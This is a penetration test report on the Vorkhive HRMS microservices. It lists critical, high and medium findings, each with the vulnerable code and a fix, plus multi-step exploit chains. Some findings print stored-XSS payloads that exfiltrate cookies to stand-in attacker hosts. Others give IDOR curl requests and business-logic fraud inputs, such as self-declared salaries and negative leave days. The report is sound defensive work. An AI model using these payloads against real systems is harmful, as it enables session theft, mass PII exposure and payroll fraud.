# Vulnerability Assessment & Penetration Test Report

**Target:** Vorkhive HRMS (NEWHRMS)
**Date:** 2026-05-28
**Scope:** 21 Node.js microservices + Next.js frontend + Python face-service
**Tester role:** Security engineer (white-box review)
**Methodology:** OWASP ASVS L2 + OWASP API Top 10 + manual code review

---

## 1. Executive Summary

The application has shipped 71/71 PRD features and ~2,300 unit + integration tests, but **the security posture is not yet production-ready**. Across 6 parallel deep-dive audits (authentication & authorization, injection, cryptography & secrets, SSRF & file upload, business logic, frontend) we identified **62 findings** of which **19 are CRITICAL** and **23 are HIGH**.

The findings cluster into four root causes:

1. **Token & identity drift between gateway and microservices.** Downstream services trust headers (`x-employee-id`, `x-user-role`) that should never have left the gateway, and the gateway in turn announces them as allowed CORS headers — so any client (or compromised service) can spoof identity if it ever reaches a service directly.
2. **Default and fallback secrets.** `INTERNAL_SERVICE_KEY=7d2b6e1a-...` is hardcoded in seven places in `docker-compose.yml`. Three services fall back to literal `'dev-internal-key'`. The seed script ships SUPER_ADMIN with password `***REMOVED***`. `***REMOVED***` is the bulk-sync password for every user. MFA OTP uses `Math.random()`.
3. **Trust-the-client business logic.** Loan amounts cap against client-supplied `monthlySalary`. Leave applications accept `employeeId` from body. Negative leave-days inflate balances. Claim `totalAmount` and `categoryId` can be amended past category caps. Claim/loan/advance approval lacks maker-checker enforcement.
4. **Stored-XSS sinks fed into `dangerouslySetInnerHTML` with tokens in JS-readable cookies.** Three independent stored-XSS sinks (e-sign personalised HTML, loan agreement, transfer letter) combined with non-HttpOnly tokens yield full session takeover from any HR-or-employee-side write.

**Recommendation:** Block production deployment until all CRITICAL and HIGH findings (P0/P1) are remediated. Estimated effort: 3–4 engineer-weeks for remediation + 1 week regression.

---

## 2. Severity Summary

| Severity | Count | Examples |
|---|---|---|
| CRITICAL | 19 | Org-wide IDOR on `/claims` and `/leave/applications`, hardcoded admin password, Math.random() MFA, stored XSS chained with JS-readable tokens, `monthlySalary` self-declared on loans |
| HIGH | 23 | OAuth `id_token` no signature verification, login rate-limit disabled (max=10 000), self-approval on claims/loans, candidate resume IDOR, `.env` 0644 with real secrets, asset IDOR |
| MEDIUM | 20 | Float arithmetic in money, e-sign integrity uses SHA-256 not HMAC, race-condition in flexi wallet, default DB password in `.env.example`, JWT 8h TTL |

---

## 3. CRITICAL Findings

### C-01 — Org-wide IDOR on claims via lowercase role check
- **File:** `services/claims-service/src/routes/claims.routes.js:35`
- **Code:** `if (req.user.role === 'employee') where.employeeId = req.user.employeeId;`
- **Why it fails:** JWTs carry uppercase roles (`'EMPLOYEE'`). Lowercase comparison never matches. `where` clause is left empty.
- **Exploit:** `curl -H "Authorization: Bearer <any-employee-jwt>" "https://gw/api/claims?limit=500"` → every claim org-wide returned (titles, amounts, vendor GST, cost centre).
- **Impact:** Mass PII exposure (salary advances visible in claim categories, medical-claim reasoning). PDPA breach.
- **Fix:** Default-deny — `const isAdmin = [SUPER_ADMIN, HR_ADMIN, FINANCE_ADMIN, PAYROLL_OFFICER].includes(req.user.role); if (!isAdmin) where.employeeId = req.user.employeeId;`

### C-02 — Org-wide IDOR on leave applications (same root cause)
- **File:** `services/leave-service/src/routes/leave.routes.js:343`
- Identical pattern as C-01. Exposes MC dates, reasons, attachment metadata for every employee.
- **Fix:** Same as C-01.

### C-03 — Cross-employee submission via `req.body.employeeId`
- **Files:** `claims-service/.../claims.routes.js:50`, `leave-service/.../leave.routes.js:375`
- **Code:** `const employeeId = req.body.employeeId || req.user.employeeId;` — no role gate.
- **Exploit:** Employee A POSTs `/claims` or `/leave/applications` with `{ employeeId: '<victim-uuid>', ... }`. The request is recorded against the victim, consuming their leave balance / claim quota.
- **Impact:** Identity theft, balance sabotage, audit-trail laundering.
- **Fix:** Only allow body `employeeId` when caller is in HR/admin allowlist. `loans-service` already does this — copy that pattern.

### C-04 — Hardcoded SUPER_ADMIN email backdoor in `/auth/me`
- **File:** `services/auth-service/src/routes/auth.routes.js:306-310`
- **Code:** `if (user.email === 'admin@vorkhive.sg' || user.email === 'admin@hrms.com') { roleName = 'SUPER_ADMIN'; }`
- **Exploit:** Any user with one of those email addresses is silently treated as SUPER_ADMIN by `/auth/me`, regardless of the DB-assigned role.
- **Impact:** A user demoted by HR remains effectively SUPER_ADMIN. Anyone able to provision an account with these emails (seed scripts, invite flow) becomes SUPER_ADMIN.
- **Fix:** Delete the override entirely.

### C-05 — Seed script ships SUPER_ADMIN with `***REMOVED***`
- **File:** `services/auth-service/scripts/seed-initial-admin.js:27`
- Operator who never rotates the password owns the system. Combined with C-04, even rotation does not help if the email remains.
- **Fix:** Require `ADMIN_PASSWORD` from env; `mustChangePassword=true` on first login; remove email override.

### C-06 — Bulk-sync gives every user the same password
- **File:** `services/auth-service/scripts/sync-users.js:54`
- **Code:** `const passwordHash = await bcrypt.hash('***REMOVED***', 12);`
- **Impact:** Knowledge of one user's seed password = access to every synced account. No `mustChangePassword` flag.
- **Fix:** Generate a random password per user; deliver via the existing signed-invite email flow.

### C-07 — `INTERNAL_SERVICE_KEY` falls back to `'dev-internal-key'`
- **Files:** `payroll-service/src/routes/payroll.routes.js:354, 1922, 1964`; `attendance-service/src/index.js:55`
- **Exploit:** If the env var ever drifts (rolling update, replica misconfig), the literal `'dev-internal-key'` becomes a valid shared secret. Anyone reachable to the service hits `/internal/period-summary/`, `/internal/daily-rate/`, `/internal/ir21-ytd/` — full payroll, salary, attendance leak.
- **Fix:** Fail closed: throw on missing env at boot. Use `crypto.timingSafeEqual` for comparison.

### C-08 — Committed `ENCRYPTION_KEY` fallback in seed script
- **File:** `services/employee-service/scripts/seed-employees.js:7`
- **Code:** `const KEY = process.env.ENCRYPTION_KEY || 'cc285661...c907c0a';` (32-byte hex committed)
- **Impact:** If this fallback was ever used to encrypt prod NRIC/salary fields, all that ciphertext is decryptable by anyone with repo access.
- **Fix:** Crash if `ENCRYPTION_KEY` is unset. Rotate ENCRYPTION_KEY immediately if this default was ever live.

### C-09 — MFA OTP generated with `Math.random()`
- **File:** `services/auth-service/src/routes/auth.routes.js:33`
- **Code:** `const code = String(Math.floor(100000 + Math.random() * 900000));`
- **Exploit:** V8 `Math.random()` is xorshift128+; state recoverable from few outputs. With the disabled login rate-limit (C-15), MFA is effectively defeated.
- **Fix:** `crypto.randomInt(100000, 1000000)`.

### C-10 — `ENCRYPTION_KEY` reused as JWT invite-token HMAC secret
- **File:** `services/auth-service/src/routes/user.routes.js:11`
- **Code:** `const INVITE_SECRET = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');`
- **Impact:** (a) Cross-purpose key reuse — JWT signing-key leak = NRIC/salary decryption key leak. (b) Random fallback invalidates all outstanding invites on container restart; multi-replica deployments can't validate each other's tokens.
- **Fix:** Dedicated `INVITE_TOKEN_SECRET` env. Never fall back.

### C-11 — Wildcard CORS + trusted-identity headers allowlisted
- **File:** `services/api-gateway/src/index.js:39-46`
- **Code:** `origin: '*'` + `allowedHeaders: ['…', 'Authorization', 'x-user-id', 'x-user-role', 'x-employee-id']`
- **Why critical:** `x-user-id`, `x-user-role`, `x-employee-id` are *trust headers* the gateway sets from the verified JWT (`index.js:96-98`). Every downstream service reads them as identity. With them announced in `Access-Control-Allow-Headers`, any HTML page can craft a CORS request setting `x-user-role: SUPER_ADMIN` — and if the service is ever reachable bypassing the gateway (internal lateral movement, SSRF chain, port exposure), it accepts the spoof.
- **Fix:** Explicit origin allowlist, remove `x-user-id`/`x-user-role`/`x-employee-id` from `allowedHeaders`. Downstream services must read identity from the verified JWT in their own `authenticate`, not from headers.

### C-12 — JWTs in JavaScript-readable cookies
- **Files:** `frontend/src/lib/api.ts:13-27` (write via `document.cookie`), ~15 sites read `document.cookie.split('vorkhive_token=')…`
- **Impact:** Any successful XSS (C-13, C-14, C-15) exfiltrates the 8h access token AND the 7d refresh token in one fetch. Refresh token grants persistent access.
- **Fix:** Backend sets `Set-Cookie: vorkhive_token=…; HttpOnly; Secure; SameSite=Strict`; remove all `document.cookie` reads; frontend uses `credentials: 'include'`. Add CSRF token once HttpOnly+SameSite=Strict is in place.

### C-13 — Stored XSS via e-sign `personalizedHtml`
- **Files:** `services/esign-service/src/engines/esign.engine.js:16-22` (`fillTemplate` raw `.replace`, no escape); sink at `frontend/src/app/(dashboard)/documents/sign/[id]/page.tsx:269` (`dangerouslySetInnerHTML`).
- **Exploit:** HR_ADMIN sends `POST /esign/requests` with `variables: { name: '<img src=x onerror="fetch(`https://atk/?c=`+document.cookie)">' }`. The signatory opens the document; payload runs in their session.
- **Impact:** Stored XSS persists for the lifetime of the request. Combined with C-12: full session theft of every signatory (every employee, for handbook-style docs). HR-to-employee privilege escalation.
- **Fix:** HTML-escape variable substitutions in `fillTemplate`; DOMPurify on the client; add CSP.

### C-14 — Stored XSS via loan agreement HTML
- **Files:** `services/loans-service/src/engines/loans.engine.js:230-254` (`generateLoanAgreement`); sink at `frontend/src/app/(dashboard)/loans/[id]/page.tsx:281`.
- **Exploit:** *Any employee* (POST /loans/staff-loans is self-serve) sets `employeeName: 'Alice<script>fetch("//atk/?c="+document.cookie)</script>'` or injects via `reason`. FINANCE_ADMIN/HR opens the loan agreement → payload runs in their session.
- **Impact:** Employee-to-FINANCE_ADMIN privilege escalation. Worse than C-13 because exploitable from low-privilege.
- **Fix:** HTML-escape `employeeName`, `reason`, `loanNumber` in `generateLoanAgreement`.

### C-15 — Login rate-limit explicitly disabled
- **File:** `services/auth-service/src/routes/auth.routes.js:86-92`
- **Code:** `max: 10000, // Effectively disabled`
- **Impact:** Credential stuffing at ~11 req/sec. Combined with `Math.random()` MFA (C-09), the second factor is also brute-forceable.
- **Fix:** `max: 10` per IP; separate stricter limiter per email; Redis-backed.

### C-16 — Negative leave-days inflate balance
- **File:** `services/leave-service/src/routes/leave.routes.js:378-432, 540-548`
- **Exploit:** POST `/leave/applications` with `startDate=2026-06-10, endDate=2026-06-01` → `totalDays = -8`. Available-check is `available < -8` → passes. On approval, `usedDays: { increment: -8 }` *reduces* used days by 8. Repeat to inflate balance arbitrarily. Encash at year-end.
- **Fix:** `if (totalDays <= 0) return 400` before the balance branch.

### C-17 — `monthlySalary` self-declared in loan/advance applications
- **File:** `services/loans-service/src/index.js:62-101, 271-326`
- **Exploit:** Employee POSTs `/loans/advances` with `{ amount: 50000, monthlySalary: 50000 }`. The 1× monthly-salary cap consults the user's claim, not the actual salary. Approver sees a "reasonable" 1× advance. Same on staff loans (60-month, 30% affordability bypass).
- **Impact:** Direct treasury fraud — funds disbursed against fabricated salary.
- **Fix:** Server-side fetch from `employee-service` (the encrypted `basicSalaryEncrypted`) using the trusted JWT `employeeId`. Drop `monthlySalary` from the request schema.

### C-18 — `PUT /candidates/:id` lets RECRUITER bypass FCF compliance gate
- **File:** `services/recruitment-service/src/routes/recruitment.routes.js:464-473`
- **Exploit:** RECRUITER PUTs `{ isHired: true, isOfferMade: true }`. This bypasses the entire `POST /candidates/:id/approve` pipeline: no FCF 14-day MyCareersFuture gate, no employee record created, no leave entitlements, no IT/payroll provisioning, no policy acknowledgements.
- **Impact:** FCF/MOM compliance evasion (S$5,000–20,000 penalty per breach, WP/EP application impact). Phantom hires planted with no audit trail.
- **Fix:** Remove `isHired`/`isOfferMade` from the allowed fields in this PUT; mutable only via `/approve`.

### C-19 — Unauthenticated asset-assignment IDOR
- **File:** `services/asset-service/src/routes/asset.routes.js:142-162`
- **Code:** `GET /employee/:employeeId` — no role check, no self check.
- **Exploit:** Any authenticated employee enumerates other employees' issued assets (laptop S/N, MAC addresses, value, assignment notes).
- **Impact:** Theft-of-asset reconnaissance; targeted social engineering with executive equipment serials.
- **Fix:** `authorizeSelfOrRole('employeeId', SUPER_ADMIN, HR_ADMIN, IT_ADMIN)`.

---

## 4. HIGH Findings

### H-01 — Stored XSS via staff-movement transfer letter
- `services/employee-service/src/engines/staff-movement.engine.js:147-170`; sink at `frontend/src/app/(dashboard)/movements/[id]/page.tsx:197`. HR-only write; HR-to-HR session theft.
- **Fix:** Escape `employeeName` and `reason`.

### H-02 — Document upload reflects attacker-supplied `mimeType` on download
- `services/employee-service/src/routes/document.routes.js:15-19, 33-51, 53-73`
- No MIME allowlist on upload, no `fileFilter`. Download sets `Content-Disposition: inline` and `Content-Type` from the stored mimetype.
- **Exploit:** HR_ADMIN uploads `evil.html` with `Content-Type: text/html`. When opened it executes JS in the HRMS origin.
- **Fix:** Allowlist MIMEs (`.pdf`/`.doc`/`.docx`/`.xls`/`.xlsx`/image). Force `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.

### H-03 — Document upload: filename path-traversal risk
- `services/employee-service/src/routes/document.routes.js:17`
- **Code:** `filename: (req, file, cb) => cb(null, ${uuidv4()}-${file.originalname})`
- The two audit agents disagreed on whether busboy strips path components from `originalname`. Multer's docs and source indicate `originalname` is preserved verbatim, which would make this exploitable to write outside `/app/uploads`. Either way, the existing `recruitment-service` and `leave-service` pattern (`${uuidv4()}${path.extname(file.originalname)}`) is safe.
- **Fix (defense in depth):** Switch to the extension-only pattern. Cost: 1 line.

### H-04 — `PUT /notifications/:id/read` has no ownership check
- `services/notification-service/src/index.js:253-261`
- Any authenticated user marks any other user's notification read (hiding payroll variance / anomaly alerts before supervisors see them).
- **Fix:** Filter by `userId` in the update.

### H-05 — `GET /notifications/:userId` accepts arbitrary userId
- `services/notification-service/src/index.js:326-335`
- Only guard: `userId !== 'me'`. Read any user's last 50 notifications.
- **Fix:** Reject if `req.params.userId !== req.user.sub` unless admin.

### H-06 — `GET /recruitment/candidates/:id` and `/resume` open to every authenticated user
- `services/recruitment-service/src/routes/recruitment.routes.js:449, 518`
- List endpoint is recruiter-gated, but single-record and resume download are not.
- **Exploit:** Iterate candidate UUIDs → download every applicant's resume, expected-salary, interview notes.
- **Fix:** `authorize(SUPER_ADMIN, HR_ADMIN, HR_MANAGER, RECRUITER)`.

### H-07 — Service-to-service token impersonates SUPER_ADMIN
- `services/auth-service/src/routes/auth.routes.js:44`, `purge.routes.js:31`
- `signAccessToken({ sub: 'auth-service', role: 'SUPER_ADMIN', permissions: ['*'] })`. Sent over plain HTTP between containers; logged by `morgan('combined')`. Anyone who captures a log line gets 8h of SUPER_ADMIN access.
- **Fix:** Use the dedicated `INTERNAL_SERVICE_KEY` header; or `aud: 'service:<target>'` enforced by middleware.

### H-08 — JWT verification doesn't enforce `iss`/`aud`; `ROLES.MANAGER` is `undefined`
- `shared/auth-middleware/index.js:34`; `services/performance-service/src/routes/performance.routes.js:409, 428, 452`
- `authorize(ROLES.SUPER_ADMIN, ROLES.HR_ADMIN, ROLES.MANAGER)` — `ROLES.MANAGER` is `undefined`. A JWT with no `role` claim (e.g. the 5-minute SSO-pending token) has `role === undefined` which matches the `undefined` slot in the allowed-list. SSO-pending users access `/performance/pips` (GET/POST/PUT).
- **Fix:** Replace `ROLES.MANAGER` with `ROLES.LINE_MANAGER`; filter falsy from allowed-list in `authorize()`; verify `iss` + `aud` in middleware; reject `sso_pending=true` from non-MFA endpoints.

### H-09 — OAuth `id_token` accepted without signature verification
- `services/auth-service/src/routes/auth.routes.js:665-668` (Google), `761-764` (Microsoft)
- Comment literally says *"verify with Google's certs for production; for now decode payload only"*.
- **Fix:** Use `google-auth-library` / `jwks-rsa`; verify `iss`, `aud`, `exp`, `nonce`.

### H-10 — `/users/consume-invite` returns the raw invite token + token is the AES key
- `services/auth-service/src/routes/user.routes.js:289-312`; `services/employee-service/src/routes/employee.routes.js:1014-1023`
- Raw 32-byte hex invite token (a) emailed in URL plaintext, (b) returned in `/consume-invite` JSON, (c) HKDF-derived into the AES-256-GCM key protecting onboarding NRIC/bank/address. Employee-service decodes the JWT *without verifying the signature*.
- **Fix:** Don't return the raw token; derive form-key server-side; verify JWT signature in employee-service; shorten the 30-day expiry.

### H-11 — OAuth token-exchange error logs full response body
- `services/auth-service/src/routes/auth.routes.js:661, 757`
- `console.error('[sso/google] Token exchange failed:', tokenData);` — if Google returns a 200 missing `id_token` (server-side condition), `tokenData` contains live `access_token` + `refresh_token`.
- **Fix:** Log only `{ error, error_description }`.

### H-12 — Refresh-token rotation race
- `services/auth-service/src/routes/auth.routes.js:242-282`
- Two concurrent refreshes with the same token both pass the `isRevoked=false` check before either update lands → two valid new refresh tokens.
- **Fix:** Wrap in `prisma.refreshToken.update({ where: { id, isRevoked: false }, ... })` — rely on row-not-found to abort.

### H-13 — `.env` file is world-readable (0644)
- `/root/NEWHRMS/.env`
- Contains real production `ENCRYPTION_KEY`, real SMTP credentials, the hardcoded `INTERNAL_SERVICE_KEY`. Any non-root process on the host can read every secret.
- **Fix:** `chmod 600 .env`; move to Docker/K8s secrets; rotate SMTP_PASS, ENCRYPTION_KEY, INTERNAL_SERVICE_KEY.

### H-14 — Claim PATCH bypasses category cap
- `services/claims-service/src/routes/claims.routes.js:104-123`
- Cap check is `if (categoryId)` — omit `categoryId` from the PATCH and the cap is skipped. Combine with H-15 to bump any small claim to a 6-figure value.
- **Fix:** Always look up `claim.categoryId` (or the new one) and re-validate `totalAmount ?? claim.totalAmount`.

### H-15 — Claims accept negative `totalAmount`
- `services/claims-service/src/routes/claims.routes.js:47-91`
- `!totalAmount` is falsy only for 0/undefined; negative values pass. Stored as `-1000`, breaks GST aggregations, treated as employee-owed credit in payroll integration.
- **Fix:** `if (!totalAmount || Number(totalAmount) <= 0) return 400`. Same for `gstAmount >= 0`.

### H-16 — No maker-checker on claim/loan/advance approval
- `services/claims-service/src/routes/claims.routes.js:129-173`; `services/loans-service/src/index.js:138-191, 383-460`
- A FINANCE_ADMIN can submit and approve their own claim/loan. Payroll-service has a DB CHECK constraint for this — claims/loans don't.
- **Fix:** Reject when `claim.employeeId === req.user.employeeId`. Add DB CHECK constraint.

### H-17 — Trust of `x-employee-id` header inside performance-service
- `services/performance-service/src/routes/performance.routes.js:177, 191, 205, 228, 249, 282, 326, 346, 367, 396, 413, 434`
- Service reads `req.headers['x-employee-id']` directly for ownership checks instead of `req.user.employeeId` (extracted from the verified JWT). Combined with C-11 (CORS announces this header), if the service is ever directly reachable, identity is spoofable.
- **Fix:** Read employeeId from the verified JWT inside `authenticate`. Same in training-service.

### H-18 — Missing Content-Security-Policy
- `frontend/next.config.js` is empty.
- Closes the door on findings C-13, C-14, H-01 if implemented. Even a minimal `default-src 'self'; script-src 'self'` blocks inline `<script>` payloads.
- **Fix:** Add CSP via `next.config.js` `headers()`.

### H-19 — SSO pending token in sessionStorage
- `frontend/src/app/auth/callback/{google,microsoft}/page.tsx`, read at `login/page.tsx:61`
- Pending token stored in JS-readable storage. Any XSS reads it and completes MFA verification on its own.
- **Fix:** Keep server-side in a cookie scoped to the MFA endpoint.

### H-20 — Role-assignment lacks hierarchy guard
- `services/auth-service/src/routes/user.routes.js:115-143`
- A user with `user:manage` permission (potentially granted to HR_ADMIN or other roles via the dynamic permission table) can PUT any user — including themselves — to `role: 'SUPER_ADMIN'`. No rule that an actor cannot grant a role ≥ their own.
- **Fix:** Add a role-hierarchy guard. Only SUPER_ADMIN grants SUPER_ADMIN/HR_ADMIN.

### H-21 — `count()`-based reference numbers race
- `loans-service/.../loans.engine.js`, `benefits-service/.../index.js`
- `LN-YYYY-00001` is generated via `count + 1` outside a transaction. Concurrent creates produce duplicate human-readable numbers (P2002 collisions) and leak business volume.
- **Fix:** DB SEQUENCE for the human-readable number.

### H-22 — OT authorization queue poisoning
- `services/attendance-service/src/index.js:1883-1929`
- `employeeId` accepted from body without verifying caller is the target's supervisor. Eats the victim's MOM 72h monthly cap.
- **Fix:** Only allow body `employeeId` for actual supervisors. Otherwise force `req.user.employeeId`.

### H-23 — `/employees/apply` decodes invite JWT without verifying signature
- `services/employee-service/src/routes/employee.routes.js:1014-1023`
- After verifying via auth-service, employee-service re-decodes the JWT body locally to extract `jti` (used as HKDF input). Combined with the consume-invite race (`if (!existing)` fall-through), enables submitting altered profile data into someone else's pending application.
- **Fix:** Use the verified payload from auth-service's response; don't re-decode locally.

---

## 5. MEDIUM Findings (condensed)

| ID | Finding | File | Fix |
|---|---|---|---|
| M-01 | E-sign integrity uses bare SHA-256 (not HMAC) | `esign-service/.../esign.engine.js:28-30` | HMAC-SHA-256 with a dedicated key, or RS256 signature |
| M-02 | Default DB password `hrms_secret_2025` in `.env.example` and `docker-compose` | `.env.example:21` | Placeholder; refuse to start if default detected; bind postgres to 127.0.0.1 |
| M-03 | 8h access-token lifetime | `docker-compose.yml:78` | 15m access + rotating refresh |
| M-04 | Global error handler echoes `err.message` to client | `auth-service/.../index.js:37-40` | Generic message + correlation id; details to server log only |
| M-05 | Flexi-wallet auto-approve TOCTOU race | `benefits-service/.../index.js:999-1077` | `SELECT … FOR UPDATE` or atomic conditional update |
| M-06 | Float arithmetic for money values | `loans-service`, `offboarding-service`, `benefits-service` | `Prisma.Decimal` + `decimal.js`; round only at presentation |
| M-07 | Client-side role caching in `localStorage` | `frontend/.../layout.tsx:391-409` | Render admin nav from live user object only |
| M-08 | Invite JWT in URL query string | `frontend/.../onboard/page.tsx:80-98` | POST token in body; strip from URL with `history.replaceState` |
| M-09 | `target="_blank"` without `noopener` (3 sites) | `frontend/.../training/page.tsx:338, 1256, 1289-1290` | Add `noopener` |
| M-10 | Face-service no `MAX_CONTENT_LENGTH` (OOM-prone but DoS — excluded per scope) | `face-service/app.py:14, 25-42, 55-97` | Set `MAX_CONTENT_LENGTH = 8 MB`; cap pixel count before resize |
| M-11 | `fillTemplate` is escape-free SSTI-adjacent (origin of C-13) | `esign-service/.../esign.engine.js:16-22` | HTML-escape values |
| M-12 | Auto-numbered references usable for enumeration | various | See H-21 |
| M-13 | Microsoft SSO "@gmail.com dot-stripped" fuzzy lookup | `auth-service/.../auth.routes.js:774-782` | Exact email match; rely on signed `email_verified` after H-09 |

---

## 6. Top Exploit Chains

These are the chains a penetration tester would write up as the "headline" attack scenarios.

### Chain 1 — Any employee → full PII harvest
1. Log in as any low-privilege employee.
2. `GET /api/claims?limit=2000` (C-01) → all claims, all vendors, all amounts.
3. `GET /api/leave/applications?limit=2000` (C-02) → all MC reasons, all leave dates.
4. `GET /api/notifications/<other-user-id>` (H-05) → other users' notifications, including payroll variance alerts.
5. `GET /api/assets/employee/<exec-uuid>` (C-19) → executive equipment serials.
6. `GET /api/recruitment/candidates/<id>/resume` (H-06) → applicant resumes.

**Time to exploit:** ~30 seconds. **Output:** full company PII dataset. **PDPA breach:** yes.

### Chain 2 — Any employee → SGD 1,000,000 loan
1. POST `/api/loans/staff-loans` with `{ amount: 1000000, tenureMonths: 60, interestRatePct: 0, monthlySalary: 200000, ... }` (C-17).
2. HR_ADMIN/FINANCE_ADMIN reviewing the queue sees a "reasonable" 30 %-instalment loan against the claimed 200k salary.
3. Once approved + activated, funds are released.

**Time to exploit:** depends on approver vigilance. **Output:** treasury fraud.

### Chain 3 — Employee → FINANCE_ADMIN session theft
1. POST `/api/loans/staff-loans` (or `/advances`) with `{ employeeName: 'Alice<script>fetch("//atk.tld/?c="+document.cookie)</script>', reason: '...', ... }` (C-14).
2. Loan agreement is auto-generated and stored.
3. FINANCE_ADMIN opens the loan-approval modal. The agreement HTML preview executes the payload in the FINANCE_ADMIN's session.
4. JS reads `document.cookie` (C-12), exfiltrates both `vorkhive_token` and `vorkhive_refresh` to attacker.
5. Attacker now has 7-day FINANCE_ADMIN refresh-token access.

**Time to exploit:** as long as it takes the approver to click. **Output:** FINANCE_ADMIN session takeover.

### Chain 4 — Operator misconfig → entire payroll dataset
1. Production `INTERNAL_SERVICE_KEY` env-var is unset on a single replica (rolling-update misconfig).
2. Attacker reaches `payroll-service:4003` (compromised container in same Docker network, or via an internal jump-host).
3. `GET /payroll/internal/ir21-ytd/<any-employee-id>/<year>` with `x-internal-service-key: dev-internal-key` (C-07) → YTD income, CPF, bonuses, BIK, ESOP gains for any employee.

**Time to exploit:** seconds (after lateral access). **Output:** full payroll dataset.

### Chain 5 — Backdoor account → SUPER_ADMIN
1. Seed/create an account with email `admin@hrms.com` (e.g., during initial bootstrap or via a `POST /users` call) (C-04).
2. Set the account to EMPLOYEE role.
3. The hardcoded `/auth/me` override returns `role: 'SUPER_ADMIN'`.
4. Any UI/API that trusts `/auth/me` for authorization (e.g. front-end nav, anything reading `req.user` *after* a re-fetch) treats the account as SUPER_ADMIN.

---

## 7. What Was Verified Safe

These categories were systematically audited and found to be clean — worth noting because they constrain the threat surface.

- **Prisma SQL injection.** All `$queryRaw`/`$executeRaw` calls use Prisma's tagged-template parameterisation. Two `$executeRawUnsafe` calls interpolate from hardcoded arrays.
- **Command injection.** Zero `child_process`/`spawn`/`exec`/`execSync`/`eval`/`new Function` in application code.
- **XXE.** No XML parsing.
- **Deserialization.** No `node-serialize`, `js-yaml`, etc. `JSON.parse` is only on DB-stored JSON or JWT payloads (no merge-into-object pattern).
- **Archive extraction.** No zip-slip surface.
- **SSRF.** Every HTTP-client call site has a hardcoded or env-derived host. No user-controlled host or protocol anywhere.
- **Resume / leave attachment uploads.** Both use `${uuidv4()}${path.extname(file.originalname)}` (safe), extension allowlists, 10 MB caps, `path.basename` on download.
- **AES-256-GCM helper itself.** `shared/crypto/index.js` is correctly implemented (random 96-bit IV per call, auth tag verified, 32-byte key enforced).
- **React XSS via auto-escaping.** Default JSX rendering is safe; only the three `dangerouslySetInnerHTML` sinks (C-13, C-14, H-01) need fixing.

---

## 8. Remediation Roadmap

**Week 1 — Stop the bleeding (P0)**

1. C-01, C-02, C-03 — flip lowercase role check; require role gate before honouring body `employeeId`. (1 day, 3 files)
2. C-04, C-05, C-06 — delete the email-based SUPER_ADMIN override; require `ADMIN_PASSWORD` env; per-user random password in sync. (1 day)
3. C-07, C-08, C-10 — fail-closed if `INTERNAL_SERVICE_KEY`/`ENCRYPTION_KEY` unset; rotate keys; separate `INVITE_TOKEN_SECRET`. (1 day)
4. C-09 — `crypto.randomInt` for MFA. (15 min)
5. C-15 — restore login rate limit. (15 min)
6. C-16 — reject `totalDays <= 0`. (15 min)
7. C-17 — server-side salary fetch for loans/advances. (½ day)
8. C-18 — drop `isHired`/`isOfferMade` from generic candidate PUT. (15 min)
9. H-13 — `chmod 600 .env`; rotate SMTP, ENCRYPTION, INTERNAL secrets. (1 hour + on-call rotation)

**Week 2 — XSS chain & frontend (P1)**

10. C-11 — tighten CORS; remove identity headers from `allowedHeaders`. (½ day)
11. C-12 — move tokens to HttpOnly/Secure/SameSite=Strict cookies; remove all `document.cookie` reads. (2 days, ~15 sites)
12. C-13, C-14, H-01, H-18 — escape variables in template helpers; DOMPurify on `dangerouslySetInnerHTML`; add CSP. (1 day)
13. H-02, H-03 — MIME allowlist + `Content-Disposition: attachment` + use ext-only filename. (½ day)

**Week 3 — Authz & approval (P1/P2)**

14. H-04 through H-12, H-16, H-17, H-19, H-20 — authorization tightening across notification, recruitment, performance, claims/loans approval. (3–4 days)
15. C-19, H-15 — asset IDOR + claim negative-amount. (½ day)

**Week 4 — Hardening (P2/P3)**

16. M-01 (HMAC for e-sign), M-03 (15m access), M-05 (flexi race), M-06 (Decimal arithmetic). (2 days)

**Then:** regression-test the entire ~2,300-test suite + targeted security regression tests for each remediated finding.

---

## 9. Conclusion

The application functions and meets its PRD; the security model does not. Most CRITICAL findings are *one-line* fixes (lowercase role check, `Math.random()`, hardcoded passwords, dropped `isHired`); the harder ones (cookie HttpOnly migration, CORS, template escaping, server-side salary lookups) are well-scoped and well-understood.

**Production go-live recommendation:** BLOCK until all CRITICAL and HIGH findings are remediated and an independent retest is performed. Estimated remediation: 3–4 engineer-weeks. Suggested follow-up: dedicated security regression suite + a permanent CI security gate (`semgrep`, `npm audit`, `gitleaks`).

---

*End of report.*
